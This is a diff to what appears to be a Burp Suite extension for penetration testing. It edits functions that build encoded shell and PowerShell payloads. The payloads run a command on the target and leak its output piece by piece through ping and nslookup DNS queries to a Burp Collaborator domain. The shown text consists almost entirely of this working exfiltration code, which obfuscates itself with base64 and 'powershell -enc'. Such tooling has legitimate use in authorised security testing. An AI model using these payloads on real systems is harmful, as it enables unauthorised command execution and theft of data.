@@ -136,14 +136,14 @@ class BurpExtender (IBurpExtender, ITab, IBurpCollaboratorInteraction, IBurpExte
     def createShPingBase64Payload(self, linuxCommand):
         global exfilFormat
         exfilFormat = "hex"
-        shCommand = linuxCommand + '''|od -A n -t x1|sed 's/ //g'|while read exfil;do ping -c1 `printf %04d $i`.$exfil.''' + self.collaboratorDomain + '''&let i=i+1;echo;done'''
+        shCommand = "i=0;" + linuxCommand + '''|od -A n -t x1|sed 's/ //g'|while read exfil;do ping -c1 `printf %04d $i`.$exfil.''' + self.collaboratorDomain + '''&i=$((i+1));echo;done'''
         return "echo " + self._helpers.base64Encode(shCommand) + "|base64 -d|sh"
 
     # Create windows powershell base64 payload
     def createPowershellBase64Payload(self, windowsCommand):
         global exfilFormat
         exfilFormat = "base64"
-        powershellCommand = '''$s=63;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","EQLS").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
+        powershellCommand = '''$s=50;$d=".''' + self.collaboratorDomain + '''";$b=[Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes((''' + windowsCommand + ''')));$c=[math]::floor($b.length/$s);0..$c|%{$e=$_*$s;$r=$(try{$b.substring($e,$s)}catch{$b.substring($e)}).replace("=","EQLS").replace("+","PLUS");$c=$_.ToString().PadLeft(4,"0");nslookup $c"."$r$d;}'''
         return "powershell -enc " + self._helpers.base64Encode(powershellCommand.encode("UTF-16-LE"))
 
     def killDanglingThreads(self):
